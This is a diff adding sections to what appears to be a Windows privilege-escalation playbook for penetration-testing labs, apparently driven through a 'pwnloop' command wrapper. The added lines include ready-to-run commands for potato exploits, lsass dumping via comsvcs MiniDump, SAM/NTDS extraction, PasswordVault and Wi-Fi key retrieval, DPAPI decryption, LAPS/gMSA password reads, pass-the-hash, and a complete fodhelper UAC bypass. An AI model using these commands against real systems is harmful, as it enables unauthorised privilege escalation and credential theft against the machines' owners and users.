@@ -31,6 +31,32 @@ The fastest wins on Windows lab boxes:
 .\GodPotato-NET4.exe -cmd "cmd /c whoami"
 ```
 
+**Which potato, and why one fails:** they all coerce a SYSTEM service to
+authenticate to a local listener; they differ in the trigger and OS coverage.
+
+- **PrintSpoofer / GodPotato** — first choice on modern Windows (2019/2022,
+  Win10/11). GodPotato works across .NET versions and is the most reliable today.
+- **JuicyPotato** — only pre-1809 (Server 2016 / older). Needs a working DCOM
+  CLSID for the OS build; picks a BITS/other CLSID.
+- **RoguePotato** — 1809+ where JuicyPotato's OXID resolver trick was patched;
+  needs an outbound `135` redirector (`-r <redir>`), so a locked-down egress
+  kills it.
+- **DCOMPotato / EfsPotato / SharpEfsPotato** — fallbacks when the spooler is
+  disabled; EfsPotato uses MS-EFSR locally.
+
+If a potato "does nothing", it usually printed the error and you truncated it:
+read the full output. `SeImpersonate` absent → potatoes are the wrong tool
+entirely; look at the other privileges below, or (on a DC) the local Kerberos
+relay in `references/ad.md`.
+
+Less-common but plantable privileges worth knowing:
+
+- **SeManageVolume** → open a handle to the volume, gain write into
+  `C:\Windows`, drop a DLL a SYSTEM service loads (e.g. a phantom DLL) → SYSTEM.
+- **SeBackup/SeRestore** → `reg save HKLM\SAM/SYSTEM/SECURITY`, or read any file
+  (copy `NTDS.dit` on a DC) and dump offline.
+- **SeDebug** → dump lsass (`rundll32 comsvcs.dll MiniDump`) or inject.
+
 ## Service misconfigurations
 
 ```powershell
@@ -105,6 +131,57 @@ reg save HKLM\SAM sam.hiv; reg save HKLM\SYSTEM sys.hiv     # needs SeBackup or 
 ```bash
 pwnloop x "impacket-secretsdump -sam sam.hiv -system sys.hiv LOCAL"
 pwnloop x "evil-winrm -i $T -u Administrator -H <nthash>"        # pass-the-hash
+```
+
+## Credential stores beyond files
+
+```powershell
+cmdkey /list                                    # saved creds → runas /savecred
+reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
+# Web Credentials / Credential Manager (DPAPI-backed)
+[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword(); $_ }
+```
+
+`runas /savecred /user:admin cmd` uses a stored cred without knowing it. Browser
+logins, `.git-credentials`, WSL, and app config in `%APPDATA%`/`%LOCALAPPDATA%`
+are all worth a pass. Wi-Fi keys: `netsh wlan show profile <n> key=clear`.
+
+## DPAPI
+
+User secrets (browser cookies, saved RDP/creds, some cert keys) are
+DPAPI-blobs. With the user's password or their masterkey you decrypt offline:
+```bash
+pwnloop x "impacket-dpapi masterkey -file <mk> -sid <SID> -password <pw>"
+pwnloop x "impacket-dpapi credential -file <blob> -key <decrypted-mk>"
+```
+As SYSTEM, the `DPAPI_SYSTEM` LSA secret decrypts every machine blob —
+`SharpDPAPI`/`mimikatz lsadump::secrets`. This is often the bridge from local
+admin to a *domain* credential stashed in a user profile.
+
+## LAPS and gMSA
+
+If the box uses LAPS, the local admin password is in AD and readable by whoever
+was delegated — check it before hunting a local privesc, it may hand you admin
+directly:
+```bash
+pwnloop x "nxc ldap $T -u <u> -p <p> -M laps"
+pwnloop x "nxc ldap $T -u <u> -p <p> --gmsa"          # gMSA managed passwords
+```
+gMSA `msDS-ManagedPassword` readers can pull the account's NT hash and use it
+(often a service account with strong rights).
+
+## UAC bypass (medium → high integrity)
+
+When you're a local admin but in a medium-integrity shell (`whoami /groups`
+shows the admin group *Deny-only*), you don't need a CVE — use an auto-elevate
+bypass: `fodhelper`, `computerdefaults`, or a `ms-settings`/`.msc` hijack.
+```powershell
+# fodhelper: point the shell-open command at your payload, then trigger
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c <payload>"
+Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
+Start-Process fodhelper.exe
 ```
 
 ## Backstop
